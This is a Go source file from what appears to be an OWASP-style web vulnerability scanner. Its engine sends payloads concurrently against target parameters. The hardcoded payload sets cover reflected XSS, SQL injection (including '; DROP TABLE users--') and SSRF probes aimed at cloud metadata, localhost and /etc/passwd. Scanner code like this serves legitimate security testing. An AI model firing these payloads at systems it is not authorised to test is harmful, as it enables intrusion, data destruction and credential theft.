package engine

import (
	"context"
	"fmt"
	"sync"
	"time"

	"github.com/owaspchecker/pkg/httpx"
)

// Engine represents the attack engine
type Engine struct {
	client      *httpx.Client
	concurrency int
	timeout     time.Duration
}

// NewEngine creates a new attack engine
func NewEngine(timeout time.Duration, concurrency int) *Engine {
	return &Engine{
		client:      httpx.NewClient(timeout),
		concurrency: concurrency,
		timeout:     timeout,
	}
}

// AttackConfig represents attack configuration
type AttackConfig struct {
	Target      string
	Method      string
	Parameters  []string
	PayloadSets []string
	Headers     map[string]string
}

// AttackResult represents the result of an attack
type AttackResult struct {
	Target       string
	TotalRequests int
	Vulnerabilities []Vulnerability
	Duration     time.Duration
	Error        error
}

// Vulnerability represents a found vulnerability
type Vulnerability struct {
	Type        string
	Parameter   string
	Payload     string
	Evidence    string
	Confidence  float64
	URL         string
	StatusCode  int
}

// PayloadSet represents a set of payloads for a specific attack type
type PayloadSet struct {
	Name     string
	Type     string
	Payloads []string
}

// Default payload sets
var DefaultPayloadSets = map[string]PayloadSet{
	"xss.reflected": {
		Name: "XSS Reflected",
		Type: "xss",
		Payloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src=javascript:alert('XSS')>",
		},
	},
	"sqli.error": {
		Name: "SQL Injection Error-based",
		Type: "sqli",
		Payloads: []string{
			"' OR 1=1--",
			"' UNION SELECT NULL--",
			"'; DROP TABLE users--",
			"' OR '1'='1",
			"admin'--",
		},
	},
	"ssrf.basic": {
		Name: "SSRF Basic",
		Type: "ssrf",
		Payloads: []string{
			"http://localhost:8080",
			"http://127.0.0.1:8080",
			"http://169.254.169.254/latest/meta-data/",
			"http://10.0.0.1",
			"file:///etc/passwd",
		},
	},
}

// RunAttack performs an attack against the target
func (e *Engine) RunAttack(ctx context.Context, config *AttackConfig) (*AttackResult, error) {
	start := time.Now()
	
	fmt.Printf("🚀 Starting attack against: %s\n", config.Target)
	fmt.Printf("📊 Concurrency: %d\n", e.concurrency)
	fmt.Printf("⏱️  Timeout: %s\n", e.timeout)
	
	// Create base request
	baseRequest := httpx.Request{
		Method:  config.Method,
		URL:     config.Target,
		Headers: config.Headers,
		Params:  make(map[string]string),
	}
	
	// If no parameters specified, use common ones
	if len(config.Parameters) == 0 {
		config.Parameters = []string{"id", "q", "search", "query", "param", "input"}
	}
	
	// If no payload sets specified, use XSS
	if len(config.PayloadSets) == 0 {
		config.PayloadSets = []string{"xss.reflected"}
	}
	
	var vulnerabilities []Vulnerability
	var totalRequests int
	var mu sync.Mutex
	
	// Create work channel
	workChan := make(chan AttackWork, 100)
	
	// Start workers
	var wg sync.WaitGroup
	for i := 0; i < e.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for work := range workChan {
				// Perform attack
				attackReq := &httpx.AttackRequest{
					BaseRequest: baseRequest,
					Payload:     work.Payload,
					Parameter:   work.Parameter,
					Type:        work.Type,
				}
				
				resp, err := e.client.PerformAttack(ctx, attackReq)
				if err != nil {
					fmt.Printf("❌ Attack failed: %v\n", err)
					continue
				}
				
				mu.Lock()
				totalRequests++
				if resp.Vulnerable {
					vuln := Vulnerability{
						Type:       resp.VulnType,
						Parameter:  resp.Parameter,
						Payload:    resp.Payload,
						Evidence:   resp.Evidence,
						Confidence: resp.Confidence,
						URL:        resp.Response.URL,
						StatusCode: resp.Response.StatusCode,
					}
					vulnerabilities = append(vulnerabilities, vuln)
					fmt.Printf("⚠️  Vulnerability found: %s in parameter %s\n", resp.VulnType, resp.Parameter)
				}
				mu.Unlock()
			}
		}()
	}
	
	// Generate attack work
	for _, payloadSetName := range config.PayloadSets {
		payloadSet, exists := DefaultPayloadSets[payloadSetName]
		if !exists {
			fmt.Printf("⚠️  Unknown payload set: %s\n", payloadSetName)
			continue
		}
		
		for _, parameter := range config.Parameters {
			for _, payload := range payloadSet.Payloads {
				work := AttackWork{
					Parameter: parameter,
					Payload:   payload,
					Type:      payloadSet.Type,
				}
				workChan <- work
			}
		}
	}
	
	close(workChan)
	wg.Wait()
	
	duration := time.Since(start)
	
	result := &AttackResult{
		Target:          config.Target,
		TotalRequests:   totalRequests,
		Vulnerabilities: vulnerabilities,
		Duration:        duration,
	}
	
	fmt.Printf("✅ Attack completed in %s\n", duration)
	fmt.Printf("📊 Total requests: %d\n", totalRequests)
	fmt.Printf("⚠️  Vulnerabilities found: %d\n", len(vulnerabilities))
	
	return result, nil
}

// AttackWork represents a single attack task
type AttackWork struct {
	Parameter string
	Payload   string
	Type      string
}

// GetPayloadSets returns available payload sets
func (e *Engine) GetPayloadSets() map[string]PayloadSet {
	return DefaultPayloadSets
}

// AddPayloadSet adds a custom payload set
func (e *Engine) AddPayloadSet(name string, payloadSet PayloadSet) {
	DefaultPayloadSets[name] = payloadSet
}
